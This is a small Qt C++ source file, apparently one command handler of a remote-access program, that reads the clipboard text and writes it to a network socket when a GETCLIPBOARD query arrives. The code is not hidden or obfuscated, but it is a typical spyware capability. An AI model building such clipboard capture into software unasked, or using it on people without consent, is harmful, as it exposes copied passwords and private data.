
#include <QClipboard>
#include <QApplication>

#include "clipboardquery.h"

namespace network
{
    namespace networkquery
    {

        ClipboardQuery::ClipboardQuery()
        {
        }

        void ClipboardQuery::execute()
        {
            QByteArray dataToWrite;

            QClipboard *clipboard = QApplication::clipboard();
            QString text = clipboard->text();

            global::functions::writeDataToByteArray(dataToWrite, GETCLIPBOARD, text);


            // emit signal to write data to socket
            emit writeData(dataToWrite);
        }
    } // networkquery
} // network
